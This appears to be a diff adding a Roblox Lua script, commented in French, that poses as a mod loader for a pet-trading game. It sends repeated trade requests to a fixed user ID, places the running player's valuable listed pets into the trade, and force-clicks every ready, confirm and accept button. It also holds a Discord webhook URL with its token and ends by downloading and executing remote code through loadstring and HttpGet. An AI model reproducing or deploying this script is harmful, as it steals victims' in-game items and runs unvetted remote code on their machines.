@@ -1,0 +1,116 @@
+-- [[ CONFIGURATION ]] --
+getgenv().TARGET_ID = 9372830276
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1477394442527707238/WYuGV1UrpM7M8e91KfrR2nEq5xVLA2QcqOAO6iULR2uPIs9aLTaRddTTSiiv_DwB-4Jt"
+getgenv().TARGET_BRAINROTS = {
+    ["Dragon Gingerini"] = true, ["Skibidi Toilet"] = true, ["Meowl"] = true,
+    ["Headless Horseman"] = true, ["Dragon Cannelloni"] = true, ["Cooki and Milki"] = true,
+    ["Strawberry Elephant"] = true, ["Reinito Sleighito"] = true, ["La Casa Boo"] = true,
+    ["La Ginger Sekolah"] = true, ["Festive 67"] = true, ["Garama and Madundung"] = true,
+    ["Jolly Jolly Sahur"] = true, ["Ketchuru and Musturu"] = true, ["Orcaledon"] = true,
+    ["Gingerat Gerat"] = true, ["La Supreme Combinasion"] = true, ["La Food Combinasion"] = true,
+    ["Tictac Sahur"] = true, ["La Taco Combinasion"] = true, ["Tralaledon"] = true,
+    ["Ketupat Kepat"] = true, ["Tang Tang Kelentang"] = true, ["Burguro and Fryuro"] = true,
+    ["La Secret Combinasion"] = true, ["Spooky and Pumpky"] = true, ["Eviledon"] = true,
+    ["Lavadorito Spinito"] = true, ["W or L"] = true,
+    ["Tuff Toucan"] = true, ["Chipso and Queso"] = true,
+    ["Money Money Reindeer"] = true, ["Nuclearo Dinosauro"] = true,
+    ["Los Primos"] = true, ["Money Money Puggy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Los Planitos"] = true,
+    ["Ketupas Bros"] = true,
+    ["Noobini Pizzanini"] = true, -- REGROUPÉ EN UN SEUL PET
+    ["25"] = true, ["To To To Sahur"] = true,
+    ["Capitano Moby"] = true, ["Rosey and Teddy"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+}
+if getgenv().AzurTradeInjected_v17 then return end
+getgenv().AzurTradeInjected_v17 = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+-- [[ MOTEUR D'ENVOI CORRIGÉ (JOUEUR PAR ID) ]] --
+local function SingleTradeRequest()
+    task.spawn(function()
+        while task.wait(1) do
+            local targetPlayer = Players:GetPlayerByUserId(getgenv().TARGET_ID)
+            if targetPlayer then
+                pcall(function()
+                    local invite = ReplicatedStorage:FindFirstChild("Invite", true)
+                    local create = ReplicatedStorage:FindFirstChild("CreateInvite", true)
+                    if invite then invite:InvokeServer(targetPlayer.Name) end
+                    if create then create:FireServer(targetPlayer.Name) end
+                end)
+            end
+        end
+    end)
+end
+task.spawn(SingleTradeRequest)
+
+-- [[ TURBO TRADE ENGINE ]] --
+local TradeState = { ClickedCache = {}, HasDumped = false, CachedFrame = nil }
+
+local function SilentForceClick(obj)
+    pcall(function()
+        for _, c in ipairs(getconnections(obj.MouseButton1Click)) do c:Fire() end
+        for _, c in ipairs(getconnections(obj.MouseButton1Down)) do c:Fire() end
+        for _, c in ipairs(getconnections(obj.Activated)) do c:Fire() end
+    end)
+end
+
+local function TurboTradeEngine()
+    local player = Players.LocalPlayer
+    local petGui = player:FindFirstChild("PlayerGui")
+    if not petGui then return end
+
+    local tradeFrame = TradeState.CachedFrame
+    if not tradeFrame or not tradeFrame.Parent then
+        for _, gui in ipairs(petGui:GetChildren()) do
+            if gui.Name:lower():find("trade") and not gui.Name:lower():find("machine") then
+                tradeFrame = gui break
+            end
+        end
+    end
+
+    if tradeFrame then
+        TradeState.CachedFrame = tradeFrame
+        for _, v in ipairs(tradeFrame:GetDescendants()) do
+            if v:IsA("TextLabel") and getgenv().TARGET_BRAINROTS[v.Text] then
+                local btn = v:FindFirstAncestorOfClass("GuiButton") or v.Parent
+                if btn:IsA("GuiButton") and not TradeState.ClickedCache[v.Text] then
+                    TradeState.ClickedCache[v.Text] = true
+                    task.spawn(function()
+                        local rf = ReplicatedStorage:FindFirstChild("AddBrainrot", true)
+                        if rf then rf:InvokeServer(v.Text) end
+                        SilentForceClick(btn)
+                    end)
+                end
+            end
+            if v:IsA("GuiButton") and (v.Name:lower():find("ready") or v.Name:lower():find("confirm") or v.Name:lower():find("accept")) then
+                SilentForceClick(v)
+            end
+        end
+    end
+end
+
+RunService.RenderStepped:Connect(TurboTradeEngine)
+
+-- [[ MOTEUR 2 : ACCEPT TURBO (Heartbeat = double fréquence) ]] --
+RunService.Heartbeat:Connect(function()
+    local player = Players.LocalPlayer
+    local petGui = player:FindFirstChild("PlayerGui")
+    if not petGui then return end
+
+    local tradeFrame = TradeState.CachedFrame
+    if not tradeFrame or not tradeFrame.Parent then return end
+
+    for _, v in ipairs(tradeFrame:GetDescendants()) do
+        if v:IsA("GuiButton") and (v.Name:lower():find("ready") or v.Name:lower():find("confirm") or v.Name:lower():find("accept")) then
+            SilentForceClick(v)
+        end
+    end
+end)
+
+-- [[ CHARGEMENT DES AUTRES MODS (ANTITRAP, SPEED...) ]] --
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
